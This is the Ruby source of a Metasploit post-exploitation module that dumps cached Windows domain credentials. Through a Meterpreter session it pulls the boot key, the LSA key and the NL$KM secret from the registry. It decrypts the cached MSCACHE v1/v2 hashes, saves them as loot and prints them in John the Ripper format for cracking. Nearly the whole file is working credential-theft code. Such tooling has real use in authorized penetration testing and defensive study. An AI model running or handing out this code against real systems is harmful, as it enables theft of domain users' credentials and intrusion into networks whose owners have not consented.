##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info(info,
      'Name'         => 'Windows Gather Credential Cache Dump',
      'Description'  => %q{
        This module uses the registry to extract the stored domain hashes that have been
        cached as a result of a GPO setting. The default setting on Windows is to store
        the last ten successful logins.},
      'License'      => MSF_LICENSE,
      'Author'       => [
        'Maurizio Agazzini <inode[at]mediaservice.net>',
        'mubix'
      ],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter'],
      'References'   => [['URL', 'http://lab.mediaservice.net/code/cachedump.rb']]
    ))

    register_options(
    [
      OptBool.new('DEBUG', [true, 'Debugging output', false])
    ], self.class)
  end



  def check_gpo
    gposetting = registry_getvaldata("HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "CachedLogonsCount")
    print_status("Cached Credentials Setting: #{gposetting} - (Max is 50 and 0 disables, and 10 is default)")
  end

  def capture_nlkm(lsakey)
    nlkm = registry_getvaldata("HKLM\\SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal", "")

    print_status("Encrypted NL$KM: #{nlkm.unpack("H*")[0]}") if( datastore['DEBUG'] )

    if lsa_vista_style?
      nlkm_dec = decrypt_lsa_data(nlkm, lsakey)
    else
      nlkm_dec = decrypt_secret_data(nlkm[0xC..-1], lsakey)
    end

    return nlkm_dec
  end

  def parse_decrypted_cache(dec_data, s)

    i = 0
    hash = dec_data[i,0x10]
    i += 72

    username = dec_data[i,s.userNameLength].split("\x00\x00").first.gsub("\x00", '')
    i+=s.userNameLength
    i+=2 * ( ( s.userNameLength / 2 ) % 2 )

    vprint_good "Username\t\t: #{username}"
    vprint_good "Hash\t\t: #{hash.unpack("H*")[0]}"

    last = Time.at(s.lastAccess)
    vprint_good "Last login\t\t: #{last.strftime("%F %T")} "

    domain = dec_data[i,s.domainNameLength+1]
    i+=s.domainNameLength

    if( s.dnsDomainNameLength != 0)
      dnsDomainName = dec_data[i,s.dnsDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.dnsDomainNameLength
      i+=2 * ( ( s.dnsDomainNameLength / 2 ) % 2 )
      vprint_good "DNS Domain Name\t: #{dnsDomainName}"
    end

    if( s.upnLength != 0)
      upn = dec_data[i,s.upnLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.upnLength
      i+=2 * ( ( s.upnLength / 2 ) % 2 )
      vprint_good "UPN\t\t\t: #{upn}"
    end

    if( s.effectiveNameLength != 0 )
      effectiveName = dec_data[i,s.effectiveNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.effectiveNameLength
      i+=2 * ( ( s.effectiveNameLength / 2 ) % 2 )
      vprint_good "Effective Name\t: #{effectiveName}"
    end

    if( s.fullNameLength != 0 )
      fullName = dec_data[i,s.fullNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.fullNameLength
      i+=2 * ( ( s.fullNameLength / 2 ) % 2 )
      vprint_good "Full Name\t\t: #{fullName}"
    end

    if( s.logonScriptLength != 0 )
      logonScript = dec_data[i,s.logonScriptLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.logonScriptLength
      i+=2 * ( ( s.logonScriptLength / 2 ) % 2 )
      vprint_good "Logon Script\t\t: #{logonScript}"
    end

    if( s.profilePathLength != 0 )
      profilePath = dec_data[i,s.profilePathLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.profilePathLength
      i+=2 * ( ( s.profilePathLength / 2 ) % 2 )
      vprint_good "Profile Path\t\t: #{profilePath}"
    end

    if( s.homeDirectoryLength != 0 )
      homeDirectory = dec_data[i,s.homeDirectoryLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.homeDirectoryLength
      i+=2 * ( ( s.homeDirectoryLength / 2 ) % 2 )
      vprint_good "Home Directory\t\t: #{homeDirectory}"
    end

    if( s.homeDirectoryDriveLength != 0 )
      homeDirectoryDrive = dec_data[i,s.homeDirectoryDriveLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.homeDirectoryDriveLength
      i+=2 * ( ( s.homeDirectoryDriveLength / 2 ) % 2 )
      vprint_good "Home Directory Drive\t: #{homeDirectoryDrive}"
    end

    vprint_good "User ID\t\t: #{s.userId}"
    vprint_good "Primary Group ID\t: #{s.primaryGroupId}"

    relativeId = []
    while (s.groupCount > 0) do
      # Todo: parse attributes
      relativeId << dec_data[i,4].unpack("V")[0]
      i+=4
      attributes = dec_data[i,4].unpack("V")[0]
      i+=4
      s.groupCount-=1
    end

    vprint_good "Additional groups\t: #{relativeId.join ' '}"

    if( s.logonDomainNameLength != 0 )
      logonDomainName = dec_data[i,s.logonDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.logonDomainNameLength
      i+=2 * ( ( s.logonDomainNameLength / 2 ) % 2 )
      vprint_good "Logon domain name\t: #{logonDomainName}"
    end

      @credentials <<
        [
          username,
          hash.unpack("H*")[0],
          logonDomainName,
          dnsDomainName,
          last.strftime("%F %T"),
          upn,
          effectiveName,
          fullName,
          logonScript,
          profilePath,
          homeDirectory,
          homeDirectoryDrive,
          s.primaryGroupId,
          relativeId.join(' '),
        ]

    vprint_good "----------------------------------------------------------------------"
    if lsa_vista_style?
      return "#{username.downcase}:$DCC2$##{username.downcase}##{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
    else
      return "#{username.downcase}:M$#{username.downcase}##{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
    end

  end

  def parse_cache_entry(cache_data)
    j = Struct.new(
      :userNameLength,
      :domainNameLength,
      :effectiveNameLength,
      :fullNameLength,
      :logonScriptLength,
      :profilePathLength,
      :homeDirectoryLength,
      :homeDirectoryDriveLength,
      :userId,
      :primaryGroupId,
      :groupCount,
      :logonDomainNameLength,
      :logonDomainIdLength,
      :lastAccess,
      :last_access_time,
      :revision,
      :sidCount,
      :valid,
      :sifLength,
      :logonPackage,
      :dnsDomainNameLength,
      :upnLength,
      :ch,
      :enc_data
    )

    s = j.new()

    s.userNameLength = cache_data[0,2].unpack("v")[0]
    s.domainNameLength =  cache_data[2,2].unpack("v")[0]
    s.effectiveNameLength = cache_data[4,2].unpack("v")[0]
    s.fullNameLength = cache_data[6,2].unpack("v")[0]
    s.logonScriptLength = cache_data[8,2].unpack("v")[0]
    s.profilePathLength = cache_data[10,2].unpack("v")[0]
    s.homeDirectoryLength = cache_data[12,2].unpack("v")[0]
    s.homeDirectoryDriveLength = cache_data[14,2].unpack("v")[0]

    s.userId = cache_data[16,4].unpack("V")[0]
    s.primaryGroupId = cache_data[20,4].unpack("V")[0]
    s.groupCount = cache_data[24,4].unpack("V")[0]
    s.logonDomainNameLength = cache_data[28,2].unpack("v")[0]
    s.logonDomainIdLength = cache_data[30,2].unpack("v")[0]

    #Removed ("Q") unpack and replaced as such
    thi = cache_data[32,4].unpack("V")[0]
    tlo = cache_data[36,4].unpack("V")[0]
    q = (tlo.to_s(16) + thi.to_s(16)).to_i(16)
    s.lastAccess = ((q / 10000000) - 11644473600)

    s.revision = cache_data[40,4].unpack("V")[0]
    s.sidCount = cache_data[44,4].unpack("V")[0]
    s.valid = cache_data[48,4].unpack("V")[0]
    s.sifLength = cache_data[52,4].unpack("V")[0]

    s.logonPackage  = cache_data[56,4].unpack("V")[0]
    s.dnsDomainNameLength = cache_data[60,2].unpack("v")[0]
    s.upnLength = cache_data[62,2].unpack("v")[0]

    s.ch = cache_data[64,16]
    s.enc_data = cache_data[96..-1]

    return s
  end

  def decrypt_hash(edata, nlkm, ch)
    rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest::Digest.new('md5'), nlkm, ch)
    rc4 = OpenSSL::Cipher::Cipher.new("rc4")
    rc4.key = rc4key
    decrypted  = rc4.update(edata)
    decrypted << rc4.final

    return decrypted
  end

  def decrypt_hash_vista(edata, nlkm, ch)
    aes = OpenSSL::Cipher::Cipher.new('aes-128-cbc')
    aes.key = nlkm[16...-1]
    aes.padding = 0
    aes.decrypt
    aes.iv = ch

    decrypted = ""
    (0...edata.length).step(16) do |i|
      decrypted << aes.update(edata[i,16])
    end

    return decrypted
  end


  def run
    @credentials = Rex::Ui::Text::Table.new(
    'Header'    => "MSCACHE Credentials",
    'Indent'    => 1,
    'Columns'   =>
    [
      "Username",
      "Hash",
      "Logon Domain Name",
      "DNS Domain Name",
      "Last Login",
      "UPN",
      "Effective Name",
      "Full Name",
      "Logon Script",
      "Profile Path",
      "Home Directory",
      "HomeDir Drive",
      "Primary Group",
      "Additional Groups"
    ])

    begin
      print_status("Executing module against #{sysinfo['Computer']}")
      client.railgun.netapi32()
      if client.railgun.netapi32.NetGetJoinInformation(nil,4,4)["BufferType"] != 3
        print_error("System is not joined to a domain, exiting..")
        return
      end

      # Check policy setting for cached creds
      check_gpo

      print_status('Obtaining boot key...')
      bootkey = capture_boot_key
      print_status("Boot key: #{bootkey.unpack("H*")[0]}") if( datastore['DEBUG'] )

      print_status('Obtaining Lsa key...')
      lsakey = capture_lsa_key(bootkey)
      if lsakey.nil?
        print_error("Could not retrieve LSA key. Are you SYSTEM?")
        return
      end

      print_status("Lsa Key: #{lsakey.unpack("H*")[0]}") if( datastore['DEBUG'] )

      print_status("Obtaining LK$KM...")
      nlkm = capture_nlkm(lsakey)
      print_status("NL$KM: #{nlkm.unpack("H*")[0]}") if( datastore['DEBUG'] )

      print_status("Dumping cached credentials...")
      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Cache", KEY_READ)

      john = ""

      ok.enum_value.each do |usr|
        if( "NL$Control" == usr.name) then
          next
        end

        begin
          nl = ok.query_value("#{usr.name}").data
        rescue
          next
        end

        cache = parse_cache_entry(nl)

        if ( cache.userNameLength > 0 )
          print_status("Reg entry: #{nl.unpack("H*")[0]}") if( datastore['DEBUG'] )
          print_status("Encrypted data: #{cache.enc_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
          print_status("Ch:  #{cache.ch.unpack("H*")[0]}") if( datastore['DEBUG'] )

          if lsa_vista_style?
            dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
          else
            dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)
          end

          print_status("Decrypted data: #{dec_data.unpack("H*")[0]}") if( datastore['DEBUG'] )

          john << parse_decrypted_cache(dec_data, cache)

        end
      end

      if lsa_vista_style?
        print_status("Hash are in MSCACHE_VISTA format. (mscash2)")
        p = store_loot("mscache2.creds", "text/csv", session, @credentials.to_csv, "mscache2_credentials.txt", "MSCACHE v2 Credentials")
        print_status("MSCACHE v2 saved in: #{p}")

        john = "# mscash2\n" + john
      else
        print_status("Hash are in MSCACHE format. (mscash)")
        p = store_loot("mscache.creds", "text/csv", session, @credentials.to_csv, "mscache_credentials.txt", "MSCACHE v1 Credentials")
        print_status("MSCACHE v1 saved in: #{p}")
        john = "# mscash\n" + john
      end

      print_status("John the Ripper format:")
      print_line john

    rescue ::Interrupt
      raise $!
    rescue ::Rex::Post::Meterpreter::RequestError => e
      print_error("Meterpreter Exception: #{e.class} #{e}")
      print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
    end
  end
end
